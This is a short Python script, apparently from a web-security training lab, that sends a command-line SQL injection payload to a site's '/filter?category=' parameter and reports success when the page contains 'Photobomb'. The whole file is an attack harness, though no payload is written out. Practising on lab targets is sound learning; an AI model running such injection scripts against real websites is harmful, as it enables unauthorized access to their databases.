import requests # python library for sending HTTP requests
import sys #handling commadn line arguments
import urllib3 #A lower-level HTTP library that requests is built upon

def sqli(url, payload):
    uri = '/filter?category='
    r = requests.get(url + uri + payload)
    if "Photobomb" in r.text:
        return True
    else:
        return False

if __name__ == "__main__": #ensure pyhton script is run directly and not as module
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()

        if sqli(url, payload):
         print("[+] SQL injection successful!")
        else:
         print("[-] SQL injection unsuccessful!")
    except IndexError:
        print(f"Usage: {sys.argv[0]} <URL> <Payload>")
        sys.exit(1)